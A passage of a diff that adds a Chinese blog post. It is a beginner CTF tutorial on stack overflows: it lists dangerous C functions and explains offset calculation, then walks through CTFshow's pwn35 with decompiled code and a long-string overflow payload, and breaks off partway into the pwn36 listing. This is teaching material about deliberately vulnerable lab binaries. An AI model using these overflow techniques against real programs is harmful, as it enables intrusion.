@@ -1,0 +1,438 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Hsad"><meta name="copyright" content="Hsad"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>pwn入门-栈溢出 | Hsad's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"hsad.xyz","root":"/","title":["watanabe","Blog"],"version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="栈溢出介绍栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：  程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。  一般步骤寻找危险">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn入门-栈溢出">
+<meta property="og:url" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="Hsad&#39;s Blog">
+<meta property="og:description" content="栈溢出介绍栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：  程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。  一般步骤寻找危险">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn35_checksec.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn36_checksec.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn36_s.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn37_checksec.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn37.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn38_checksec.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn38_buf.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn38_ret.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn39_checksec.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn39_system.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn39_binsh.png">
+<meta property="og:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn40_checksec.png">
+<meta property="article:published_time" content="2024-11-09T14:51:42.000Z">
+<meta property="article:modified_time" content="2025-07-13T11:40:36.781Z">
+<meta property="article:author" content="Hsad">
+<meta property="article:tag" content="CTFshow">
+<meta property="article:tag" content="Test_your_nc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/pwn35_checksec.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Hsad"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Hsad"><span class="site-author-status" title="凉">☺️</span></a><div class="site-author-name"><a href="/about/">Hsad</a></div><span class="site-name">Hsad's Blog</span><sub class="site-subtitle">一个人的世界</sub><div class="site-description">翻着我们的照片 想念若隐若现</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">55</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">43</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=EYiK7-b5ur1mWxbX7aV2AEBsuoW9c732" title="QQ" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/watanabe-hsad" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:dubian.zzy@outlook.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.2.</span> <span class="toc-text">一般步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">寻找危险函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6"><span class="toc-number">1.2.2.</span> <span class="toc-text">确定填充长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn35-80"><span class="toc-number">2.</span> <span class="toc-text">pwn35-80</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn35-dest-strcpy"><span class="toc-number">2.1.</span> <span class="toc-text">pwn35(dest strcpy)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn36-ret2fun"><span class="toc-number">2.2.</span> <span class="toc-text">pwn36(ret2fun)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn37-ret2text"><span class="toc-number">2.3.</span> <span class="toc-text">pwn37(ret2text)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn38-%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1"><span class="toc-number">2.4.</span> <span class="toc-text">pwn38(堆栈平衡)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn39"><span class="toc-number">2.5.</span> <span class="toc-text">pwn39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn40"><span class="toc-number">2.6.</span> <span class="toc-text">pwn40</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://hsad.xyz/2024/11/09/pwn%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Hsad"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hsad's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">pwn入门-栈溢出</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-11-09 22:51:42" itemprop="dateCreated datePublished" datetime="2024-11-09T22:51:42+08:00">2024-11-09</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-07-13 19:40:36" itemprop="dateModified" datetime="2025-07-13T19:40:36+08:00">2025-07-13</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">安全相关</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTFshow/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">CTFshow</span></a><a class="tag-item" href="/tags/Test-your-nc/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Test_your_nc</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p>
+<ul>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+<h4 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h4><h5 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h5><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
+<ul>
+<li>输入<ul>
+<li>gets，直接读取一行，忽略’\x00’</li>
+<li>scanf</li>
+<li>vscanf</li>
+</ul>
+</li>
+<li>输出<ul>
+<li>sprintf</li>
+</ul>
+</li>
+<li>字符串<ul>
+<li>strcpy，字符串复制，遇到’\x00’停止</li>
+<li>strcat，字符串拼接，遇到’\x00’停止</li>
+<li>bcopy</li>
+</ul>
+</li>
+</ul>
+<h5 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h5><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>一般来说，我们会有如下的覆盖需求</p>
+<ul>
+<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
+<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
+<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
+<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
+<h3 id="pwn35-80"><a href="#pwn35-80" class="headerlink" title="pwn35-80"></a>pwn35-80</h3><h4 id="pwn35-dest-strcpy"><a href="#pwn35-dest-strcpy" class="headerlink" title="pwn35(dest strcpy)"></a>pwn35(dest strcpy)</h4><p><img src="pwn35_checksec.png" loading="lazy"></p>
+<p>32位 部分开启RELRO保护 关闭了栈保护与PIE  </p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-1Ch]</span>
+
+  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80488D4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag: No such file or directory."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__sighandler_t<span class="token punctuation">)</span>sigsegv_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048910<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048984<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048A00<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048A8C<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048B1C<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048BA0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048C34<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048CF8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Stack_Overflow                                          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : See what the program does!                              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Where is flag?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"QaQ!FLAG IS NOT HERE! Here is your input : %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-6Ch]</span>
+
+  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>程序首先将<code>/ctfshow_flag</code>文件内容读入变量<code>flag</code>中 然后判断<code>argc</code>参数 </p>
+<p><code>argc</code>是我们启动函数时输入的参数的数量加1，因为程序默认有argc&#x3D;1，且第一个参数为程序的名称即<code>argv[0]</code>，此后我们输入的参数就为<code>argv[1]</code></p>
+<p>如果<code>argc&gt;2</code> 就进入<code>ctfshow()</code>把<code>argv[1]</code>的值赋给<code>dest</code>然后返回指向<code>dest</code>的指针并输出</p>
+<p>Payload:</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">./pwnme aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre>
+
+<h4 id="pwn36-ret2fun"><a href="#pwn36-ret2fun" class="headerlink" title="pwn36(ret2fun)"></a>pwn36(ret2fun)</h4><p><img src="pwn36_checksec.png" loading="lazy"></p>
+<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段  </p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_804883C<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80488B0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_804892C<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80489B8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048A48<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048ACC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048B60<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048C24<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Stack_Overflow                                          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : There are backdoor functions here!                      "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Find and use it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter what you want: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
